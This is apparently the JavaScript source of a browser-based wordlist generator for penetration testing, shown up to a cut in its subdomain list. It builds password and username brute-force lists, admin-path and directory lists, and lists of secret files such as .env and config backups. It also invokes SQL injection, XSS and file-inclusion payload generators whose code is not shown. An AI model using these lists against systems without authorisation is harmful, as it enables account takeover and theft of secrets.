
// Wordlist Arsenal - Advanced Cybersecurity Tool by 0x0806
// Global Variables
let currentWordlist = [];
let generationHistory = [];
let appStats = {
    totalGenerated: 0,
    totalSessions: 1,
    totalDownloads: 0,
    mostUsedGenerator: 'enumeration'
};

// Initialize Application
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    setupEventListeners();
    loadFromLocalStorage();
    updateStats();
});

// Initialize Application
function initializeApp() {
    // Set initial session
    appStats.totalSessions = parseInt(localStorage.getItem('totalSessions') || '0') + 1;
    localStorage.setItem('totalSessions', appStats.totalSessions);
    
    // Show welcome toast
    showToast('Welcome to Wordlist Arsenal! 🛡️', 'success');
    
    // Initialize drag and drop
    initializeDragDrop();
    
    // Load quick action handlers
    initializeQuickActions();
}

// Setup Event Listeners
function setupEventListeners() {
    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => switchTab(btn.dataset.tab));
    });
    
    // File input
    document.getElementById('fileInput').addEventListener('change', handleFileUpload);
    
    // Modal close on background click
    document.getElementById('helpModal').addEventListener('click', (e) => {
        if (e.target === e.currentTarget) hideHelp();
    });
    
    // Keyboard shortcuts
    document.addEventListener('keydown', handleKeyboardShortcuts);
}

// Tab Switching
function switchTab(tabName) {
    // Update active tab button
    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
    document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
    
    // Update active panel
    document.querySelectorAll('.generator-panel').forEach(panel => panel.classList.remove('active'));
    document.getElementById(tabName).classList.add('active');
}

// Initialize Drag and Drop
function initializeDragDrop() {
    const uploadZone = document.getElementById('uploadZone');
    
    uploadZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadZone.classList.add('dragover');
    });
    
    uploadZone.addEventListener('dragleave', () => {
        uploadZone.classList.remove('dragover');
    });
    
    uploadZone.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadZone.classList.remove('dragover');
        const files = e.dataTransfer.files;
        handleFileUpload({ target: { files } });
    });
    
    uploadZone.addEventListener('click', () => {
        document.getElementById('fileInput').click();
    });
}

// File Upload Handler
function handleFileUpload(event) {
    const files = Array.from(event.target.files);
    files.forEach(file => {
        const reader = new FileReader();
        reader.onload = (e) => {
            const content = e.target.result;
            analyzeWordlist(content, file.name);
        };
        reader.readAsText(file);
    });
}

// Analyze Uploaded Wordlist
function analyzeWordlist(content, filename) {
    const words = content.split('\n').filter(word => word.trim());
    const stats = calculateWordlistStats(words);
    
    showToast(`Analyzed ${filename}: ${stats.count} words, ${stats.unique} unique`, 'success');
    
    // Add to history
    addToHistory({
        type: 'File Analysis',
        filename,
        stats,
        timestamp: new Date().toISOString()
    });
}

// Quick Actions
function initializeQuickActions() {
    document.querySelectorAll('.quick-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const generator = btn.dataset.generator;
            executeQuickAction(generator);
        });
    });
}

function executeQuickAction(generator) {
    showProgress();
    
    setTimeout(() => {
        let wordlist = [];
        
        switch(generator) {
            case 'common-passwords':
                wordlist = generateCommonPasswords();
                break;
            case 'web-dirs':
                wordlist = generateWebDirectories();
                break;
            case 'usernames':
                wordlist = generateCommonUsernames();
                break;
            case 'subdomains':
                wordlist = generateSubdomains();
                break;
        }
        
        displayResults(wordlist, `Quick Action: ${generator}`);
        hideProgress();
    }, 500);
}

// Generator Functions
function generateEnumeration() {
    const config = {
        common: document.getElementById('enum-common').checked,
        admin: document.getElementById('enum-admin').checked,
        backup: document.getElementById('enum-backup').checked,
        config: document.getElementById('enum-config').checked,
        extensions: document.getElementById('enum-extensions').value.split(',').map(ext => ext.trim()).filter(ext => ext),
        custom: document.getElementById('enum-custom').value.split('\n').filter(path => path.trim())
    };
    
    let wordlist = [];
    
    if (config.common) {
        wordlist.push(...getCommonDirectories());
    }
    
    if (config.admin) {
        wordlist.push(...getAdminPaths());
    }
    
    if (config.backup) {
        wordlist.push(...getBackupFiles());
    }
    
    if (config.config) {
        wordlist.push(...getConfigFiles());
    }
    
    // Add extensions
    if (config.extensions.length > 0) {
        const baseWords = [...wordlist];
        config.extensions.forEach(ext => {
            baseWords.forEach(word => {
                wordlist.push(`${word}.${ext}`);
            });
        });
    }
    
    // Add custom paths
    wordlist.push(...config.custom);
    
    displayResults(wordlist, 'Web Discovery Enumeration');
}

function generateBruteForce() {
    const config = {
        common: document.getElementById('bf-common').checked,
        numeric: document.getElementById('bf-numeric').checked,
        keyboard: document.getElementById('bf-keyboard').checked,
        dates: document.getElementById('bf-dates').checked,
        minLength: parseInt(document.getElementById('bf-min').value),
        maxLength: parseInt(document.getElementById('bf-max').value),
        lowercase: document.getElementById('bf-lowercase').checked,
        uppercase: document.getElementById('bf-uppercase').checked,
        numbers: document.getElementById('bf-numbers').checked,
        special: document.getElementById('bf-special').checked
    };
    
    let wordlist = [];
    
    if (config.common) {
        wordlist.push(...getCommonPasswords());
    }
    
    if (config.numeric) {
        wordlist.push(...generateNumericPatterns(config.minLength, config.maxLength));
    }
    
    if (config.keyboard) {
        wordlist.push(...getKeyboardPatterns());
    }
    
    if (config.dates) {
        wordlist.push(...generateDatePatterns());
    }
    
    // Generate character combinations
    if (config.lowercase || config.uppercase || config.numbers || config.special) {
        wordlist.push(...generateCharacterCombinations(config));
    }
    
    displayResults(wordlist, 'Password Brute Force');
}

function generateCredentials() {
    const config = {
        routers: document.getElementById('cred-routers').checked,
        databases: document.getElementById('cred-databases').checked,
        web: document.getElementById('cred-web').checked,
        os: document.getElementById('cred-os').checked,
        format: document.getElementById('cred-format').value,
        vendor: document.getElementById('cred-vendor').value.toLowerCase().trim()
    };
    
    let credentials = [];
    
    if (config.routers) {
        credentials.push(...getRouterCredentials());
    }
    
    if (config.databases) {
        credentials.push(...getDatabaseCredentials());
    }
    
    if (config.web) {
        credentials.push(...getWebCredentials());
    }
    
    if (config.os) {
        credentials.push(...getOSCredentials());
    }
    
    // Filter by vendor if specified
    if (config.vendor) {
        credentials = credentials.filter(cred => 
            cred.vendor && cred.vendor.toLowerCase().includes(config.vendor)
        );
    }
    
    // Format output
    const wordlist = credentials.map(cred => {
        switch(config.format) {
            case 'user:pass':
                return `${cred.username}:${cred.password}`;
            case 'user pass':
                return `${cred.username} ${cred.password}`;
            case 'user/pass':
                return `${cred.username}/${cred.password}`;
            case 'json':
                return JSON.stringify(cred);
            default:
                return `${cred.username}:${cred.password}`;
        }
    });
    
    displayResults(wordlist, 'Default Credentials');
}

function generateUsernames() {
    const config = {
        names: document.getElementById('user-names').value.split('\n').filter(name => name.trim()),
        firstname: document.getElementById('user-firstname').checked,
        lastname: document.getElementById('user-lastname').checked,
        firstlast: document.getElementById('user-firstlast').checked,
        flast: document.getElementById('user-flast').checked,
        numbers: document.getElementById('user-numbers').checked,
        years: document.getElementById('user-years').checked,
        common: document.getElementById('user-common').checked,
        suffixes: document.getElementById('user-suffixes').value.split(',').map(s => s.trim()).filter(s => s)
    };
    
    let wordlist = [];
    
    if (config.common) {
        wordlist.push(...getCommonUsernames());
    }
    
    config.names.forEach(name => {
        const parts = name.trim().split(/\s+/);
        if (parts.length >= 2) {
            const first = parts[0].toLowerCase();
            const last = parts[parts.length - 1].toLowerCase();
            
            if (config.firstname) wordlist.push(first);
            if (config.lastname) wordlist.push(last);
            if (config.firstlast) wordlist.push(`${first}.${last}`);
            if (config.flast) wordlist.push(`${first[0]}.${last}`);
            
            // Add mutations
            if (config.numbers) {
                for (let i = 1; i <= 99; i++) {
                    wordlist.push(`${first}${i}`);
                    wordlist.push(`${last}${i}`);
                }
            }
            
            if (config.years) {
                for (let year = 1980; year <= 2024; year++) {
                    wordlist.push(`${first}${year}`);
                    wordlist.push(`${last}${year}`);
                }
            }
            
            // Add custom suffixes
            config.suffixes.forEach(suffix => {
                wordlist.push(`${first}${suffix}`);
                wordlist.push(`${last}${suffix}`);
            });
        }
    });
    
    displayResults(wordlist, 'Username Generation');
}

function generatePatterns() {
    const config = {
        rules: document.getElementById('pattern-rules').value.split('\n').filter(rule => rule.trim()),
        words: document.getElementById('pattern-words').value.split('\n').filter(word => word.trim()),
        iterations: parseInt(document.getElementById('pattern-iterations').value)
    };
    
    let wordlist = [];
    
    config.rules.forEach(rule => {
        for (let i = 0; i < config.iterations; i++) {
            const generated = generateFromPattern(rule, config.words);
            if (generated) wordlist.push(generated);
        }
    });
    
    displayResults(wordlist, 'Custom Patterns');
}

function generateHybrid() {
    const config = {
        base: document.getElementById('hybrid-base').value.split('\n').filter(word => word.trim()),
        prepend: document.getElementById('hybrid-prepend').checked,
        append: document.getElementById('hybrid-append').checked,
        years: document.getElementById('hybrid-years').checked,
        special: document.getElementById('hybrid-special').checked,
        leet: document.getElementById('hybrid-leet').checked,
        case: document.getElementById('hybrid-case').checked,
        reverse: document.getElementById('hybrid-reverse').checked,
        custom: document.getElementById('hybrid-custom').value.split(',').map(s => s.trim()).filter(s => s)
    };
    
    let wordlist = [...config.base];
    
    config.base.forEach(word => {
        const baseWord = word.trim();
        
        if (config.prepend) {
            for (let i = 0; i <= 999; i++) {
                wordlist.push(`${i}${baseWord}`);
            }
        }
        
        if (config.append) {
            for (let i = 0; i <= 999; i++) {
                wordlist.push(`${baseWord}${i}`);
            }
        }
        
        if (config.years) {
            for (let year = 1980; year <= 2024; year++) {
                wordlist.push(`${baseWord}${year}`);
            }
        }
        
        if (config.special) {
            const specialChars = ['!', '@', '#', '$', '%', '^', '&', '*'];
            specialChars.forEach(char => {
                wordlist.push(`${baseWord}${char}`);
                wordlist.push(`${char}${baseWord}`);
            });
        }
        
        if (config.leet) {
            wordlist.push(toLeetSpeak(baseWord));
        }
        
        if (config.case) {
            wordlist.push(baseWord.toUpperCase());
            wordlist.push(capitalizeFirst(baseWord));
        }
        
        if (config.reverse) {
            wordlist.push(baseWord.split('').reverse().join(''));
        }
        
        config.custom.forEach(addition => {
            wordlist.push(`${baseWord}${addition}`);
            wordlist.push(`${addition}${baseWord}`);
        });
    });
    
    displayResults(wordlist, 'Hybrid Combinations');
}

function generateAPI() {
    const config = {
        rest: document.getElementById('api-rest').checked,
        graphql: document.getElementById('api-graphql').checked,
        soap: document.getElementById('api-soap').checked,
        webhooks: document.getElementById('api-webhooks').checked,
        get: document.getElementById('api-get').checked,
        post: document.getElementById('api-post').checked,
        put: document.getElementById('api-put').checked,
        delete: document.getElementById('api-delete').checked
    };
    
    let wordlist = [];
    
    if (config.rest) {
        wordlist.push(...getRESTEndpoints());
    }
    
    if (config.graphql) {
        wordlist.push(...getGraphQLEndpoints());
    }
    
    if (config.soap) {
        wordlist.push(...getSOAPEndpoints());
    }
    
    if (config.webhooks) {
        wordlist.push(...getWebhookEndpoints());
    }
    
    displayResults(wordlist, 'API Endpoints');
}

function generateWebTech() {
    const config = {
        wordpress: document.getElementById('tech-wordpress').checked,
        drupal: document.getElementById('tech-drupal').checked,
        joomla: document.getElementById('tech-joomla').checked,
        magento: document.getElementById('tech-magento').checked,
        apache: document.getElementById('tech-apache').checked,
        nginx: document.getElementById('tech-nginx').checked,
        tomcat: document.getElementById('tech-tomcat').checked,
        iis: document.getElementById('tech-iis').checked
    };
    
    let wordlist = [];
    
    if (config.wordpress) {
        wordlist.push(...getWordPressPaths());
    }
    
    if (config.drupal) {
        wordlist.push(...getDrupalPaths());
    }
    
    if (config.joomla) {
        wordlist.push(...getJoomlaPaths());
    }
    
    if (config.magento) {
        wordlist.push(...getMagentoPaths());
    }
    
    if (config.apache) {
        wordlist.push(...getApachePaths());
    }
    
    if (config.nginx) {
        wordlist.push(...getNginxPaths());
    }
    
    if (config.tomcat) {
        wordlist.push(...getTomcatPaths());
    }
    
    if (config.iis) {
        wordlist.push(...getIISPaths());
    }
    
    displayResults(wordlist, 'Web Technology Paths');
}

function generateSecurity() {
    const config = {
        sqli: document.getElementById('sec-sqli').checked,
        xss: document.getElementById('sec-xss').checked,
        lfi: document.getElementById('sec-lfi').checked,
        rfi: document.getElementById('sec-rfi').checked,
        basic: document.getElementById('sec-basic').checked,
        advanced: document.getElementById('sec-advanced').checked,
        bypass: document.getElementById('sec-bypass').checked,
        encoded: document.getElementById('sec-encoded').checked
    };
    
    let wordlist = [];
    
    if (config.sqli) {
        wordlist.push(...getSQLInjectionPayloads(config));
    }
    
    if (config.xss) {
        wordlist.push(...getXSSPayloads(config));
    }
    
    if (config.lfi) {
        wordlist.push(...getLFIPayloads(config));
    }
    
    if (config.rfi) {
        wordlist.push(...getRFIPayloads(config));
    }
    
    displayResults(wordlist, 'Security Testing Payloads');
}

// Utility Functions
function generateFromPattern(pattern, words) {
    let result = pattern;
    
    // Replace placeholders
    result = result.replace(/@l/g, () => getRandomChar('abcdefghijklmnopqrstuvwxyz'));
    result = result.replace(/@u/g, () => getRandomChar('ABCDEFGHIJKLMNOPQRSTUVWXYZ'));
    result = result.replace(/@d/g, () => getRandomChar('0123456789'));
    result = result.replace(/@s/g, () => getRandomChar('!@#$%^&*()_+-=[]{}|;:,.<>?'));
    result = result.replace(/@w/g, () => words[Math.floor(Math.random() * words.length)] || '');
    
    return result;
}

function getRandomChar(charset) {
    return charset[Math.floor(Math.random() * charset.length)];
}

function toLeetSpeak(word) {
    const leetMap = {
        'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7', 'l': '1'
    };
    return word.toLowerCase().split('').map(char => leetMap[char] || char).join('');
}

function capitalizeFirst(word) {
    return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
}

function calculateWordlistStats(words) {
    const unique = [...new Set(words)];
    const totalLength = words.join('').length;
    const avgLength = words.length > 0 ? (totalLength / words.length).toFixed(1) : 0;
    
    return {
        count: words.length,
        unique: unique.length,
        size: new Blob([words.join('\n')]).size,
        avgLength: avgLength
    };
}

function displayResults(wordlist, generatorName) {
    currentWordlist = [...new Set(wordlist)]; // Remove duplicates
    const stats = calculateWordlistStats(currentWordlist);
    
    // Update results
    document.getElementById('resultsTextarea').value = currentWordlist.join('\n');
    document.getElementById('wordCount').textContent = stats.count.toLocaleString();
    document.getElementById('fileSize').textContent = formatBytes(stats.size);
    document.getElementById('uniqueCount').textContent = stats.unique.toLocaleString();
    document.getElementById('avgLength').textContent = stats.avgLength;
    
    // Update global stats
    appStats.totalGenerated += stats.count;
    updateStats();
    
    // Add to history
    addToHistory({
        type: generatorName,
        count: stats.count,
        timestamp: new Date().toISOString(),
        wordlist: currentWordlist.slice(0, 100) // Store first 100 for preview
    });
    
    showToast(`Generated ${stats.count} words for ${generatorName}`, 'success');
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function showProgress() {
    const progressBar = document.getElementById('progressBar');
    const progressFill = progressBar.querySelector('.progress-fill');
    
    progressBar.style.display = 'block';
    progressFill.style.width = '0%';
    
    let width = 0;
    const interval = setInterval(() => {
        width += 2;
        progressFill.style.width = width + '%';
        if (width >= 100) {
            clearInterval(interval);
        }
    }, 10);
}

function hideProgress() {
    setTimeout(() => {
        document.getElementById('progressBar').style.display = 'none';
    }, 500);
}

// Action Functions
function copyToClipboard() {
    const textarea = document.getElementById('resultsTextarea');
    textarea.select();
    document.execCommand('copy');
    showToast('Wordlist copied to clipboard!', 'success');
}

function downloadWordlist() {
    if (currentWordlist.length === 0) {
        showToast('No wordlist to download', 'error');
        return;
    }
    
    const blob = new Blob([currentWordlist.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    
    a.href = url;
    a.download = `wordlist_${new Date().getTime()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    appStats.totalDownloads++;
    updateStats();
    showToast('Wordlist downloaded successfully!', 'success');
}

function saveToHistory() {
    if (currentWordlist.length === 0) {
        showToast('No wordlist to save', 'error');
        return;
    }
    
    const historyItem = {
        type: 'Manual Save',
        count: currentWordlist.length,
        timestamp: new Date().toISOString(),
        wordlist: currentWordlist
    };
    
    addToHistory(historyItem);
    showToast('Wordlist saved to history!', 'success');
}

function addToHistory(item) {
    generationHistory.unshift(item);
    if (generationHistory.length > 50) {
        generationHistory.pop();
    }
    
    updateHistoryDisplay();
    saveToLocalStorage();
}

function updateHistoryDisplay() {
    const historyList = document.getElementById('historyList');
    
    if (generationHistory.length === 0) {
        historyList.innerHTML = '<div class="history-empty">No history yet</div>';
        return;
    }
    
    historyList.innerHTML = generationHistory.slice(0, 10).map(item => `
        <div class="history-item" onclick="loadFromHistory(${generationHistory.indexOf(item)})">
            <div class="history-item-title">${item.type}</div>
            <div class="history-item-meta">
                ${item.count ? `${item.count} words • ` : ''}
                ${new Date(item.timestamp).toLocaleString()}
            </div>
        </div>
    `).join('');
}

function loadFromHistory(index) {
    const item = generationHistory[index];
    if (item && item.wordlist) {
        currentWordlist = item.wordlist;
        displayResults(currentWordlist, `From History: ${item.type}`);
    }
}

function updateStats() {
    document.getElementById('totalGenerated').textContent = appStats.totalGenerated.toLocaleString();
    document.getElementById('totalSessions').textContent = appStats.totalSessions.toLocaleString();
    document.getElementById('totalDownloads').textContent = appStats.totalDownloads.toLocaleString();
}

function saveToLocalStorage() {
    localStorage.setItem('wordlistArsenalHistory', JSON.stringify(generationHistory));
    localStorage.setItem('wordlistArsenalStats', JSON.stringify(appStats));
}

function loadFromLocalStorage() {
    const savedHistory = localStorage.getItem('wordlistArsenalHistory');
    const savedStats = localStorage.getItem('wordlistArsenalStats');
    
    if (savedHistory) {
        generationHistory = JSON.parse(savedHistory);
        updateHistoryDisplay();
    }
    
    if (savedStats) {
        const stats = JSON.parse(savedStats);
        appStats.totalGenerated = stats.totalGenerated || 0;
        appStats.totalDownloads = stats.totalDownloads || 0;
        updateStats();
    }
}

function showToast(message, type = 'info') {
    const toastContainer = document.getElementById('toastContainer');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    
    toastContainer.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
    }, 3000);
}

function showHelp() {
    document.getElementById('helpModal').classList.add('active');
}

function hideHelp() {
    document.getElementById('helpModal').classList.remove('active');
}

function handleKeyboardShortcuts(event) {
    if (event.ctrlKey || event.metaKey) {
        switch(event.key) {
            case 'c':
                if (event.target.tagName !== 'INPUT' && event.target.tagName !== 'TEXTAREA') {
                    event.preventDefault();
                    copyToClipboard();
                }
                break;
            case 's':
                event.preventDefault();
                downloadWordlist();
                break;
            case 'h':
                event.preventDefault();
                showHelp();
                break;
        }
    }
    
    if (event.key === 'Escape') {
        hideHelp();
    }
}

// Wordlist Data Sources
function getCommonDirectories() {
    return [
        'admin', 'administrator', 'wp-admin', 'wp-content', 'wp-includes',
        'login', 'dashboard', 'panel', 'control', 'manage', 'manager',
        'assets', 'css', 'js', 'javascript', 'images', 'img', 'uploads', 'files',
        'backup', 'backups', 'bak', 'old', 'archive', 'archives',
        'config', 'configuration', 'settings', 'setup', 'install', 'installation',
        'test', 'testing', 'dev', 'development', 'staging', 'demo', 'preview',
        'api', 'apis', 'v1', 'v2', 'v3', 'rest', 'graphql', 'soap', 'webhook',
        'public', 'private', 'secure', 'protected', 'restricted', 'internal',
        'temp', 'tmp', 'cache', 'logs', 'log', 'debug', 'error', 'errors',
        'docs', 'documentation', 'help', 'support', 'wiki', 'manual',
        'blog', 'news', 'forum', 'community', 'user', 'users', 'profile',
        'account', 'accounts', 'member', 'members', 'client', 'customer',
        'shop', 'store', 'cart', 'checkout', 'payment', 'order', 'orders',
        'search', 'results', 'browse', 'category', 'categories', 'product',
        'download', 'downloads', 'file', 'upload', 'media', 'gallery',
        'home', 'index', 'main', 'default', 'welcome', 'about', 'contact',
        'lib', 'library', 'libraries', 'vendor', 'vendors', 'third-party',
        'plugins', 'plugin', 'modules', 'module', 'components', 'component',
        'themes', 'theme', 'templates', 'template', 'layouts', 'layout',
        'includes', 'include', 'common', 'shared', 'utils', 'utilities',
        'scripts', 'script', 'style', 'styles', 'stylesheet', 'stylesheets',
        'fonts', 'font', 'icons', 'icon', 'graphics', 'resources',
        'data', 'database', 'db', 'sql', 'json', 'xml', 'csv',
        'export', 'import', 'sync', 'backup', 'restore', 'migrate',
        'tools', 'tool', 'admin-tools', 'utilities', 'helper', 'helpers',
        'reports', 'report', 'analytics', 'stats', 'statistics', 'metrics',
        'monitoring', 'monitor', 'health', 'status', 'ping', 'check',
        'mail', 'email', 'smtp', 'pop', 'imap', 'webmail', 'newsletter',
        'security', 'auth', 'authentication', 'authorization', 'oauth',
        'token', 'tokens', 'session', 'sessions', 'cookie', 'cookies',
        'ssl', 'tls', 'https', 'cert', 'certificate', 'certificates',
        'mobile', 'app', 'apps', 'application', 'applications', 'service',
        'services', 'worker', 'workers', 'job', 'jobs', 'queue', 'cron',
        'cdn', 'static', 'assets-cdn', 'media-cdn', 'img-cdn', 'js-cdn',
        'staging-api', 'dev-api', 'test-api', 'beta-api', 'alpha-api',
        'cms', 'content', 'pages', 'page', 'posts', 'post', 'articles',
        'editor', 'edit', 'create', 'new', 'add', 'delete', 'remove',
        'update', 'modify', 'change', 'save', 'submit', 'form', 'forms',
        'ajax', 'async', 'xhr', 'fetch', 'request', 'response', 'callback',
        'embed', 'widget', 'widgets', 'iframe', 'frame', 'popup', 'modal'
    ];
}

function getAdminPaths() {
    return [
        'admin.php', 'admin.html', 'admin.asp', 'admin.aspx',
        'administrator.php', 'administrator.html', 'administrator.asp',
        'login.php', 'login.html', 'login.asp', 'login.aspx',
        'cp.php', 'cp.html', 'controlpanel.php', 'control.php',
        'wp-admin/', 'wp-login.php', 'wp-admin.php',
        'admin/', 'admin/index.php', 'admin/login.php',
        'manager/', 'management/', 'adm/', 'admins/',
        'administrator/', 'moderator/', 'webadmin/',
        'adminarea/', 'bb-admin/', 'adminLogin/',
        'admin_area/', 'panel-administracion/', 'instadmin/',
        'memberadmin/', 'administratorlogin/', 'adm/',
        'admin/account.php', 'admin/index.html', 'admin/login.html',
        'admin/admin.html', 'admin_area/admin.html', 'admin_area/login.html',
        'siteadmin/', 'siteadmin/index.php', 'siteadmin/login.php'
    ];
}

function getBackupFiles() {
    return [
        'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.txt',
        'database.sql', 'db.sql', 'dump.sql', 'data.sql',
        'site.zip', 'website.zip', 'web.tar.gz', 'www.zip',
        'old.zip', 'archive.zip', 'files.zip', 'temp.zip',
        'backup.tar', 'backup.rar', 'backup.7z', 'backup.gz',
        'config.bak', 'config.old', 'config.backup', 'config.save',
        'settings.bak', 'settings.old', 'wp-config.php.bak',
        'database.backup', 'db.backup', 'mysql.backup',
        'copy.txt', 'orig.txt', 'original.txt', 'backup.php'
    ];
}

function getConfigFiles() {
    return [
        'config.php', 'config.inc.php', 'config.inc', 'configuration.php',
        'wp-config.php', 'wp-config.inc', 'settings.php', 'settings.inc',
        'database.php', 'db.php', 'connect.php', 'connection.php',
        'constants.php', 'defines.php', 'global.php', 'globals.php',
        'config.xml', 'config.json', 'config.ini', 'config.yaml',
        'settings.xml', 'settings.json', 'settings.ini', 'settings.yaml',
        'app.config', 'web.config', 'application.config', 'site.config',
        'config.txt', 'config.cfg', 'config.conf', 'configuration.txt',
        'env', '.env', '.env.local', '.env.production', '.env.development',
        'secrets', '.secrets', 'credentials', '.credentials'
    ];
}

function generateCommonPasswords() {
    return [
        // Most common passwords
        'password', '123456', '123456789', 'qwerty', 'abc123',
        'password1', 'admin', 'letmein', 'welcome', '1234567890',
        'Password', 'PASSWORD', 'password123', 'admin123', 'root',
        'toor', 'pass', 'test', 'guest', 'user', 'demo', 'sample',
        '12345', '1234567', '12345678', '123456789', '1234567890',
        
        // Keyboard patterns
        'qwerty123', 'asdfgh', 'zxcvbn', 'poiuyt', 'mnbvcx',
        'qwertyuiop', 'asdfghjkl', 'zxcvbnm', '1qaz2wsx', 'qazwsx',
        'qweasd', 'qweasdzxc', 'adgjmptw', '1q2w3e4r', '1q2w3e',
        
        // Popular names and words
        'dragon', 'monkey', 'football', 'baseball', 'soccer',
        'master', 'shadow', 'jordan', 'superman', 'batman',
        'trustno1', 'iloveyou', 'princess', 'rockyou', 'sunshine',
        'charlie', 'daniel', 'robert', 'jessica', 'matthew',
        'michael', 'jennifer', 'william', 'ashley', 'nicole',
        
        // Common variations
        'admin1234', 'password12', 'password1234', 'pass123',
        'test123', 'user123', 'guest123', 'demo123', 'temp123',
        'changeme', 'change', 'default', 'secret', 'private',
        'system', 'service', 'manager', 'operator', 'supervisor',
        
        // Date patterns
        '2024', '2023', '2022', '2021', '2020', '1234',
        '01012024', '12345678', '87654321', '11111111',
        '00000000', '12341234', '56785678', '90909090',
        
        // Special character patterns
        'password!', 'admin!', 'test!', '123456!', 'qwerty!',
        'password@', 'admin@', 'test@', '123456@', 'qwerty@',
        'password#', 'admin#', 'test#', '123456#', 'qwerty#',
        'password$', 'admin$', 'test$', '123456$', 'qwerty$',
        
        // Technology related
        'linux', 'windows', 'ubuntu', 'debian', 'centos',
        'mysql', 'oracle', 'postgres', 'mongodb', 'redis',
        'apache', 'nginx', 'tomcat', 'jetty', 'iis',
        'docker', 'kubernetes', 'jenkins', 'gitlab', 'github',
        
        // Company/brand names
        'cisco', 'netgear', 'linksys', 'dlink', 'tplink',
        'microsoft', 'google', 'amazon', 'facebook', 'twitter',
        'apple', 'samsung', 'huawei', 'xiaomi', 'nokia',
        
        // Security defaults
        'security', 'firewall', 'vpn', 'proxy', 'gateway',
        'router', 'switch', 'bridge', 'access', 'control',
        'monitor', 'backup', 'restore', 'update', 'patch',
        
        // Empty and simple
        '', ' ', 'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
        '1', '11', '111', '1111', '11111', '111111',
        'x', 'xx', 'xxx', 'xxxx', 'xxxxx', 'xxxxxx'
    ];
}

function generateWebDirectories() {
    return [
        'admin', 'administrator', 'wp-admin', 'wp-content', 'wp-includes',
        'login', 'dashboard', 'panel', 'control', 'manage', 'manager',
        'assets', 'css', 'js', 'javascript', 'images', 'img', 'uploads',
        'files', 'documents', 'downloads', 'media', 'gallery', 'photos',
        'backup', 'backups', 'bak', 'old', 'archive', 'archives',
        'config', 'configuration', 'settings', 'setup', 'install',
        'test', 'testing', 'dev', 'development', 'staging', 'demo',
        'api', 'apis', 'v1', 'v2', 'rest', 'graphql', 'soap',
        'public', 'private', 'secure', 'protected', 'restricted',
        'temp', 'tmp', 'cache', 'logs', 'log', 'debug', 'error'
    ];
}

function generateCommonUsernames() {
    return [
        // Basic admin accounts
        'admin', 'administrator', 'root', 'user', 'guest', 'demo',
        'test', 'testuser', 'sample', 'example', 'default', 'sa',
        'sysadmin', 'system', 'operator', 'manager', 'service',
        'support', 'helpdesk', 'webmaster', 'postmaster', 'mail',
        
        // Web services
        'ftp', 'www', 'web', 'apache', 'nginx', 'httpd', 'www-data',
        'tomcat', 'jetty', 'iis', 'lighttpd', 'caddy', 'traefik',
        
        // Database users
        'mysql', 'postgres', 'postgresql', 'oracle', 'mssql', 'sqlserver',
        'db2', 'mongodb', 'mongo', 'redis', 'elastic', 'elasticsearch',
        'cassandra', 'neo4j', 'influxdb', 'mariadb', 'sqlite',
        
        // Development tools
        'jenkins', 'git', 'svn', 'gitlab', 'github', 'bitbucket',
        'docker', 'kubernetes', 'k8s', 'ansible', 'puppet', 'chef',
        'terraform', 'vagrant', 'bamboo', 'teamcity', 'travis',
        
        // Monitoring/Logging
        'backup', 'monitoring', 'nagios', 'zabbix', 'cacti', 'grafana',
        'kibana', 'splunk', 'elk', 'logstash', 'fluentd', 'prometheus',
        'alertmanager', 'sensu', 'icinga', 'pandora', 'observium',
        
        // Network services
        'network', 'radius', 'ldap', 'bind', 'dns', 'dhcp', 'ntp',
        'snmp', 'tftp', 'syslog', 'proxy', 'squid', 'haproxy',
        'nginx-proxy', 'reverse-proxy', 'load-balancer', 'firewall',
        
        // Cloud services
        'aws', 'azure', 'gcp', 'cloudflare', 'digitalocean', 'linode',
        'vultr', 'heroku', 'vercel', 'netlify', 'cloud', 'ec2',
        'lambda', 's3', 'rds', 'dynamo', 'cognito', 'iam',
        
        // Common first names
        'john', 'jane', 'admin1', 'admin2', 'user1', 'user2',
        'test1', 'test2', 'dev', 'developer', 'devops', 'ops',
        'security', 'sec', 'audit', 'auditor', 'compliance',
        
        // Service accounts
        'service-account', 'svc', 'app', 'application', 'api',
        'worker', 'daemon', 'cron', 'scheduler', 'queue',
        'batch', 'job', 'task', 'process', 'thread',
        
        // Special characters variations
        'admin_user', 'admin-user', 'admin.user', 'test_user',
        'test-user', 'test.user', 'guest_user', 'guest-user',
        'guest.user', 'demo_user', 'demo-user', 'demo.user',
        
        // Numbers
        'admin123', 'user123', 'test123', 'guest123', 'demo123',
        'user001', 'user002', 'user003', 'admin001', 'admin002',
        'test001', 'test002', 'guest001', 'guest002', 'demo001',
        
        // Organizational roles
        'ceo', 'cto', 'cio', 'cso', 'manager', 'director',
        'supervisor', 'lead', 'senior', 'junior', 'intern',
        'contractor', 'vendor', 'external', 'consultant',
        
        // Empty and minimal
        '', 'a', 'admin@', '@admin', '_admin', 'admin_',
        '-admin', 'admin-', '.admin', 'admin.'
    ];
}

function generateSubdomains() {
    return [
        // Standard web services
        'www', 'mail', 'ftp', 'admin', 'webmail', 'secure', 'vpn',
        'remote', 'blog', 'shop', 'store', 'forum', 'support',
        'help', 'docs', 'wiki', 'portal', 'gateway', 'proxy',
        
        // API services
        'api', 'rest', 'graphql', 'soap', 'ws', 'service',
        'api1', 'api2', 'api-v1', 'api-v2', 'v1', 'v2', 'v3',
        'services', 'microservice', 'webhook', 'callback',
        
